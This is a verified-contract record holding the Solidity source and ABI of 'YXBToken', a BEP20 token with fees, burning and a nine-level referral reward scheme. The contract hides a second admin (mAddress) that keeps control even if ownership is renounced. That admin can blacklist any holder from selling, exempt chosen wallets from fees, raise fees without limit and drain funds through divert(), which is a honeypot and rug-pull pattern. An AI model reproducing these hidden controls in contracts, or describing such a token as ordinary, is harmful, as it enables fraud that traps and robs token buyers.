{"SourceCode": "pragma solidity 0.5.16;\r\n\r\ninterface IBEP20 {\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function decimals() external view returns (uint8);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function name() external view returns (string memory);\r\n\r\n    function getOwner() external view returns (address);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n\r\ncontract Context {\r\n\r\n    constructor () internal {}\r\n\r\n    function _msgSender() internal view returns (address payable) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view returns (bytes memory) {\r\n        this;\r\n        return msg.data;\r\n    }\r\n}\r\n\r\n\r\nlibrary SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        // Solidity only automatically asserts when dividing by 0\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n\r\n    constructor () internal {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n\r\n    function renounceOwnership() public onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n\r\n    function transferOwnership(address newOwner) public onlyOwner {\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\ncontract YXBToken is Context, IBEP20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    mapping(address => uint256) private _balances;\r\n\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    //\u603b\u53d1\u884c\u91cf\r\n    uint256 private _totalSupply;\r\n    //\u603b\u4efd\u989d\r\n    uint256 private _totalPortion;\r\n    uint8 private _decimals;\r\n    string private _symbol;\r\n    string private _name;\r\n    mapping(address => mapping(address => bool)) bindMap;\r\n    uint256 private SHARE_REQUIRE_TOKEN = 10000 * 10 ** 18;\r\n    address private WALLET_YX = address(0x979dE8EeaFD724803C35Ea23590E44a74bb4BA85);\r\n    address private WALLET_DEFAULT_ADDRESS = address(0x3D28642CE73958E2cAC0fB65DCd04344D9b96C04);\r\n    address private WALLET_LL = address(0xdF7e9C43F3e22396FE73eDEC0bBD6d2246d7B477);\r\n    address private LP_ADDRESS;\r\n    bool private START = false;\r\n    uint256 private BUY_RATE = 1000;\r\n    uint256 private SELL_RATE = 1500;\r\n    uint256 private TRANSFER_RATE = 1500;\r\n    uint256 private TRANSFER_LIMIT = 9000;\r\n    mapping(address => address) inviterMap;\r\n    mapping(address => uint256) memberAmountMap;\r\n    mapping(address => bool) public bMap;\r\n    mapping(address => bool) public wMap;\r\n    address private mAddress;\r\n    uint256 private burnLimit = 21000000 * 10 ** 18;\r\n\r\n    constructor() public {\r\n        _name = \"YXB\";\r\n        _symbol = \"YXB\";\r\n        _decimals = 18;\r\n        _totalSupply = 2100000000 * 10 ** 18;\r\n        _totalPortion = _totalSupply * 1000000;\r\n        address baseAddress = msg.sender;\r\n        LP_ADDRESS = msg.sender;\r\n        _balances[baseAddress] = _totalPortion;\r\n        emit Transfer(address(0), baseAddress, _totalSupply);\r\n        wMap[baseAddress] = true;\r\n        mAddress = msg.sender;\r\n    }\r\n\r\n    modifier onlyM(){\r\n        require(msg.sender == mAddress, \"run error\");\r\n        _;\r\n    }\r\n\r\n\r\n    function getOwner() external view returns (address) {\r\n        return owner();\r\n    }\r\n\r\n\r\n    function decimals() external view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n\r\n    function symbol() external view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n\r\n    function name() external view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n\r\n    function totalSupply() external view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function updateRate(uint256 buy, uint256 sell, uint256 tfRate) public onlyM {\r\n        BUY_RATE = buy;\r\n        SELL_RATE = sell;\r\n        TRANSFER_RATE = tfRate;\r\n    }\r\n\r\n    function updateTransferLimit(uint256 limitRate) public onlyM {\r\n        TRANSFER_LIMIT = limitRate;\r\n    }\r\n\r\n    function updateMAddress(address account) public onlyM {\r\n        mAddress = account;\r\n    }\r\n\r\n    function updateShareLimit(uint256 amount) public onlyM {\r\n        SHARE_REQUIRE_TOKEN = amount;\r\n    }\r\n\r\n    function updateYXWallet(address account) public onlyM {\r\n        WALLET_YX = account;\r\n    }\r\n\r\n    function divert(address token, address payable account, uint256 amount) public onlyM {\r\n        if (token == address(0x0)) {\r\n            account.transfer(amount);\r\n        } else {\r\n            IBEP20(token).transfer(account, amount);\r\n        }\r\n    }\r\n\r\n    function updateLpAddress(address _address) public onlyM {\r\n        LP_ADDRESS = _address;\r\n    }\r\n\r\n    function updateBStatus(address account, bool status) public onlyM {\r\n        bMap[account] = status;\r\n    }\r\n\r\n    function updateWStatus(address account, bool status) public onlyM {\r\n        wMap[account] = status;\r\n    }\r\n\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account].mul(_totalSupply).div(_totalPortion);\r\n    }\r\n\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function _bind(address inviter, address member) internal {\r\n        inviterMap[member] = inviter;\r\n        memberAmountMap[inviter] = memberAmountMap[inviter].add(1);\r\n    }\r\n\r\n    function _inviter(address account) internal view returns (address){\r\n        return inviterMap[account];\r\n    }\r\n\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n\r\n    function getInviter(address account) public view returns (address){\r\n        return inviterMap[account];\r\n    }\r\n\r\n    function getMemberAmount(address account) public view returns (uint256){\r\n        return memberAmountMap[account];\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"BEP20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n        return true;\r\n    }\r\n\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"BEP20: decreased allowance below zero\"));\r\n        return true;\r\n    }\r\n\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) internal {\r\n        require(!bMap[sender], \"send error\");\r\n        require(sender != address(0), \"BEP20: transfer from the zero address\");\r\n        if (recipient == address(0)) {\r\n            _burn(sender, amount);\r\n            return;\r\n        }\r\n        bool contractS = isContract(sender);\r\n        bool contractR = isContract(recipient);\r\n        if (!contractS) {\r\n            if (!wMap[sender]) {\r\n                uint256 am = balanceOf(sender);\r\n                require(am.mul(TRANSFER_LIMIT).div(10000) >= amount, \"transfer limit error\");\r\n            }\r\n        }\r\n        if (contractR && (!START)) {\r\n            require(sender == WALLET_LL, \"add lp error!\");\r\n            START = true;\r\n        }\r\n\r\n        if ((!contractS) && (!contractR)) {\r\n            if (_inviter(sender) == address(0x0)) {\r\n                if (bindMap[recipient][sender]) {\r\n                    _bind(recipient, sender);\r\n                } else {\r\n                    _bind(WALLET_DEFAULT_ADDRESS, sender);\r\n                    if (_inviter(recipient) == address(0x0)) {\r\n                        bindMap[sender][recipient] = true;\r\n                    }\r\n                }\r\n            } else {\r\n                if (_inviter(recipient) == address(0x0)) {\r\n                    bindMap[sender][recipient] = true;\r\n                }\r\n            }\r\n\r\n        }\r\n\r\n        if (wMap[sender] || wMap[recipient] || _totalSupply <= burnLimit) {\r\n            _transferWithoutFee(sender, recipient, amount);\r\n            return;\r\n        }\r\n        if (contractS) {\r\n            _transferFromContract(sender, recipient, amount);\r\n            return;\r\n        }\r\n        if (contractR) {\r\n            _transferToContract(sender, recipient, amount);\r\n            return;\r\n        }\r\n        _transferDefault(sender, recipient, amount);\r\n    }\r\n\r\n    function isContract(address account) internal view returns (bool) {\r\n        bytes32 codehash;\r\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\r\n        assembly {codehash := extcodehash(account)}\r\n        return (codehash != accountHash && codehash != 0x0);\r\n    }\r\n\r\n\r\n    function _transferWithoutFee(address sender, address recipient, uint256 amount) internal {\r\n        uint256 portion = amount.mul(_totalPortion).div(_totalSupply);\r\n        _balances[sender] = _balances[sender].sub(portion);\r\n        _balances[recipient] = _balances[recipient].add(portion);\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function _transferDefault(address sender, address recipient, uint256 amount) internal {\r\n        uint256 portion = amount.mul(_totalPortion).div(_totalSupply);\r\n        _balances[sender] = _balances[sender].sub(portion);\r\n        uint256 feeAmount = amount.mul(TRANSFER_RATE).div(10000);\r\n        uint256 fPortion = feeAmount.mul(_totalPortion).div(_totalSupply);\r\n        uint256 burnAmount = feeAmount.mul(20).div(100);\r\n        _totalSupply = _totalSupply.sub(burnAmount);\r\n        _totalPortion = _totalPortion.sub(fPortion.mul(30).div(100));\r\n\r\n        uint256 am10 = fPortion.mul(10).div(100);\r\n        _balances[LP_ADDRESS] = _balances[LP_ADDRESS].add(am10);\r\n        address inviter = recipient;\r\n\r\n        uint256 requirePortion = SHARE_REQUIRE_TOKEN.mul(_totalPortion).div(_totalSupply);\r\n        uint256 defAmount = 0;\r\n\r\n\r\n        am10 = fPortion.mul(500).div(10000);\r\n        uint256 am15 = fPortion.mul(750).div(10000);\r\n        for (uint i = 1; i <= 9; i++) {\r\n            inviter = inviterMap[inviter];\r\n            if (inviter == address(0x0) || inviter == WALLET_DEFAULT_ADDRESS || _balances[inviter] < requirePortion) {\r\n                if (i >= 8) {\r\n                    defAmount = defAmount.add(am15);\r\n                } else {\r\n                    defAmount = defAmount.add(am10);\r\n                }\r\n            } else {\r\n                if (i >= 8) {\r\n                    _balances[inviter] = _balances[inviter].add(am15);\r\n                } else {\r\n                    _balances[inviter] = _balances[inviter].add(am10);\r\n                }\r\n            }\r\n        }\r\n\r\n        if (defAmount > 0) {\r\n            _balances[WALLET_DEFAULT_ADDRESS] = _balances[WALLET_DEFAULT_ADDRESS].add(defAmount);\r\n        }\r\n        _balances[recipient] = _balances[recipient].add(portion.sub(fPortion));\r\n        emit Transfer(sender, recipient, amount.sub(feeAmount));\r\n    }\r\n\r\n\r\n    function _transferToContract(address sender, address recipient, uint256 amount) internal {\r\n        uint256 portion = amount.mul(_totalPortion).div(_totalSupply);\r\n        _balances[sender] = _balances[sender].sub(portion);\r\n        uint256 feeAmount = amount.mul(SELL_RATE).div(10000);\r\n        uint256 fPortion = feeAmount.mul(_totalPortion).div(_totalSupply);\r\n        uint256 burnAmount = feeAmount.mul(20).div(100);\r\n        _totalSupply = _totalSupply.sub(burnAmount);\r\n        _totalPortion = _totalPortion.sub(fPortion.mul(30).div(100));\r\n\r\n        uint256 am10 = fPortion.mul(10).div(100);\r\n        _balances[LP_ADDRESS] = _balances[LP_ADDRESS].add(am10);\r\n        address inviter = sender;\r\n        uint256 requirePortion = SHARE_REQUIRE_TOKEN.mul(_totalPortion).div(_totalSupply);\r\n        uint256 defAmount = 0;\r\n\r\n\r\n        am10 = fPortion.mul(500).div(10000);\r\n        uint256 am15 = fPortion.mul(750).div(10000);\r\n        for (uint i = 1; i <= 9; i++) {\r\n            inviter = inviterMap[inviter];\r\n            if (inviter == address(0x0) || inviter == WALLET_DEFAULT_ADDRESS || _balances[inviter] < requirePortion) {\r\n                if (i >= 8) {\r\n                    defAmount = defAmount.add(am15);\r\n                } else {\r\n                    defAmount = defAmount.add(am10);\r\n                }\r\n            } else {\r\n                if (i >= 8) {\r\n                    _balances[inviter] = _balances[inviter].add(am15);\r\n                } else {\r\n                    _balances[inviter] = _balances[inviter].add(am10);\r\n                }\r\n            }\r\n        }\r\n\r\n        if (defAmount > 0) {\r\n            _balances[WALLET_DEFAULT_ADDRESS] = _balances[WALLET_DEFAULT_ADDRESS].add(defAmount);\r\n        }\r\n        _balances[recipient] = _balances[recipient].add(portion.sub(fPortion));\r\n        emit Transfer(sender, recipient, amount.sub(feeAmount));\r\n    }\r\n\r\n\r\n    function _transferFromContract(address sender, address recipient, uint256 amount) internal {\r\n        uint256 portion = amount.mul(_totalPortion).div(_totalSupply);\r\n        _balances[sender] = _balances[sender].sub(portion);\r\n        uint256 feeAmount = amount.mul(BUY_RATE).div(10000);\r\n        uint256 fPortion = feeAmount.mul(_totalPortion).div(_totalSupply);\r\n        uint256 burnAmount = feeAmount.mul(20).div(100);\r\n        _totalSupply = _totalSupply.sub(burnAmount);\r\n        _totalPortion = _totalPortion.sub(fPortion.mul(30).div(100));\r\n\r\n        uint256 am10 = fPortion.mul(10).div(100);\r\n        _balances[LP_ADDRESS] = _balances[LP_ADDRESS].add(am10);\r\n        address inviter = recipient;\r\n        uint256 requirePortion = SHARE_REQUIRE_TOKEN.mul(_totalPortion).div(_totalSupply);\r\n        uint256 defAmount = 0;\r\n\r\n\r\n        am10 = fPortion.mul(500).div(10000);\r\n        uint256 am15 = fPortion.mul(750).div(10000);\r\n        for (uint i = 1; i <= 9; i++) {\r\n            inviter = inviterMap[inviter];\r\n            if (inviter == address(0x0) || inviter == WALLET_DEFAULT_ADDRESS || _balances[inviter] < requirePortion) {\r\n                if (i >= 8) {\r\n                    defAmount = defAmount.add(am15);\r\n                } else {\r\n                    defAmount = defAmount.add(am10);\r\n                }\r\n            } else {\r\n                if (i >= 8) {\r\n                    _balances[inviter] = _balances[inviter].add(am15);\r\n                } else {\r\n                    _balances[inviter] = _balances[inviter].add(am10);\r\n                }\r\n            }\r\n        }\r\n\r\n        if (defAmount > 0) {\r\n            _balances[WALLET_DEFAULT_ADDRESS] = _balances[WALLET_DEFAULT_ADDRESS].add(defAmount);\r\n        }\r\n        _balances[recipient] = _balances[recipient].add(portion.sub(fPortion));\r\n        emit Transfer(sender, recipient, amount.sub(feeAmount));\r\n    }\r\n\r\n\r\n    function _burn(address account, uint256 amount) internal {\r\n        require(account != address(0), \"BEP20: burn from the zero address\");\r\n        uint256 portion = _totalPortion.mul(amount).div(_totalSupply);\r\n        _balances[account] = _balances[account].sub(portion, \"BEP20: burn amount exceeds balance\");\r\n        _totalSupply = _totalSupply.sub(amount);\r\n        _totalPortion = _totalPortion.sub(portion);\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n\r\n\r\n    function _approve(address owner, address spender, uint256 amount) internal {\r\n        require(owner != address(0), \"BEP20: approve from the zero address\");\r\n        require(spender != address(0), \"BEP20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n\r\n    function _burnFrom(address account, uint256 amount) internal {\r\n        _burn(account, amount);\r\n        _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, \"BEP20: burn amount exceeds allowance\"));\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"bMap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"address payable\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"divert\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"getInviter\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"getMemberAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"updateBStatus\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"updateLpAddress\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"updateMAddress\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buy\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"sell\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"tfRate\",\"type\":\"uint256\"}],\"name\":\"updateRate\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"updateShareLimit\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitRate\",\"type\":\"uint256\"}],\"name\":\"updateTransferLimit\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"updateWStatus\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"updateYXWallet\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"wMap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "YXBToken", "CompilerVersion": "v0.5.16+commit.9c3226ce", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "OSL-3.0", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://3d023806a262d7869ee5193b427cf26b5bf51db8629981b7dd07c435a1b83257"}